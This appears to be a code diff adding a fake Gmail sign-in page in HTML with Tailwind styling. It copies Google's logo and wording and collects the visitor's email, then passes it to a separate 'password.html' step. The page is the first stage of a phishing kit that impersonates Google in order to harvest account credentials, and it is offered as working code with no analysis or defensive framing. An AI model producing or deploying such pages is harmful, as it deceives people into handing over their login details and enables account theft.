@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>Gmail Login</title>
+		<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
+		<script>
+			function redirectToPasswordPage() {
+				var email = document.getElementById("email").value;
+				window.location.href = "password.html?email=" + encodeURIComponent(email);
+			}
+		</script>
+		<style>
+			/* Fullscreen loader styles */
+			#loading-screen {
+				position: fixed;
+				top: 0;
+				left: 0;
+				width: 100%;
+				height: 100%;
+				background-color: white;
+				display: flex;
+				align-items: center;
+				justify-content: center;
+				z-index: 1000;
+			}
+
+			#loading-logo {
+				opacity: 1;
+				transition: opacity 1s ease-in-out;
+			}
+
+			/* Hide main content until the loading screen is finished */
+			#main-content {
+				opacity: 0;
+				transition: opacity 1s ease-in-out;
+			}
+
+			/* When loading is done, hide loading screen and show main content */
+			body.loaded #loading-screen {
+				display: none;
+			}
+
+			body.loaded #main-content {
+				opacity: 1;
+			}
+		</style>
+	</head>
+	<body class="bg-gray-50 flex items-center justify-center h-screen">
+		<!-- Loading Screen -->
+		<div id="loading-screen">
+			<img id="loading-logo" src="OIP.jpeg" alt="Loading Logo" />
+		</div>
+
+		<!-- Main Content -->
+		<div id="main-content" class="bg-white p-8 rounded-md shadow-md w-full max-w-md">
+			<div class="text-center mb-6">
+				<img
+					src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png"
+					alt="Google Logo"
+					class="mx-auto mb-4"
+				/>
+				<h2 class="text-2xl font-semibold text-gray-800">Sign in</h2>
+				<p class="text-gray-600">to continue to Gmail</p>
+			</div>
+			<form onsubmit="event.preventDefault(); redirectToPasswordPage();">
+				<div class="mb-4">
+					<label for="email" class="block text-gray-700">Email or phone</label>
+					<input
+						type="email"
+						id="email"
+						class="mt-1 block w-full px-4 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+						required
+						autocomplete="email"
+					/>
+				</div>
+				<div class="flex justify-end mb-6">
+					<a href="/forgot.html" class="text-blue-500 text-sm">Forgot email?</a>
+				</div>
+				<button
+					type="submit"
+					class="w-full bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2"
+				>
+					Next
+				</button>
+				<div class="flex justify-between items-center mt-6 text-sm text-gray-600">
+					<p>
+						Not your computer? Use <a href="/guest.html" class="text-blue-500">Guest mode</a> to sign in
+						privately.
+					</p>
+				</div>
+			</form>
+			<div class="text-center mt-8">
+				<a href="/create.html" class="text-blue-500 text-sm">Create account</a>
+			</div>
+		</div>
+
+		<script>
+			// Wait for the page to load
+			window.addEventListener("load", function () {
+				// After 3 seconds, fade out the logo and show the main content
+				setTimeout(function () {
+					document.getElementById("loading-logo").style.opacity = "0";
+					setTimeout(function () {
+						document.body.classList.add("loaded");
+					}, 1000); // Allow 1 second for the fade-out effect
+				}, 3000);
+			});
+		</script>
+	</body>
+</html>
